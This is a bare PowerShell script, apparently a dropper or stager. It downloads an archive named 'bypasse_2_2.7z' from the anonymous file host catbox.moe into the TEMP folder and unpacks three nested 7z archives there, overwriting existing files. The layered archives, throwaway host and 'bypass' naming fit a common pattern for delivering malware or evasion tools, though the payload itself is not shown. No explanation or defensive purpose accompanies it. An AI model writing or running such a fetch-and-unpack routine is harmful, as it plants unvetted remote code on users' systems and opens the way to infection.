$url = "https://files.catbox.moe/7vfkvz.7z" 
$output = Join-Path $env:TEMP "bypasse_2_2.7z"
Invoke-WebRequest -Uri $url -OutFile $output
$sevenZipPath = "C:\Program Files\7-Zip\7z.exe"
& "$sevenZipPath" x $output -o"$env:TEMP" -aoa
& "$sevenZipPath" x (Join-Path $env:TEMP "bypasse_2.7z") -o"$env:TEMP" -aoa
& "$sevenZipPath" x (Join-Path $env:TEMP "bypasse.7z") -o"$env:TEMP" -aoa
